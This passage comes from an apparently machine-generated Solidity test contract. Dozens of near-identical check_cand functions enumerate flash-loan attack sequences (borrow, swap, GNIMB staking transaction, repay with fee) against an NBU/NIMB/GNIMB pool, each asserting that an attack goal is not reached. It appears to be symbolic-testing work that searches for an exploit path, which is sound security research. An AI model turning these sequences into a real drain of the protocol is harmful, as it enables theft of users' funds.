        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3698(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3699(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3700(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3701(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3702(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3703(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3704(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3705(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3706(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3707(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3708(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3709(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3710(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3711(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3712(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3713(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3714(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3715(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3716(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3717(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3718(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3719(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3720(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3721(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3722(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3723(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3724(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3725(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3726(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3727(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3728(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3729(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3730(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3731(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3732(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3733(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3734(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3735(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3736(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3737(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3738(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3739(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3740(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3741(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3742(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3743(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
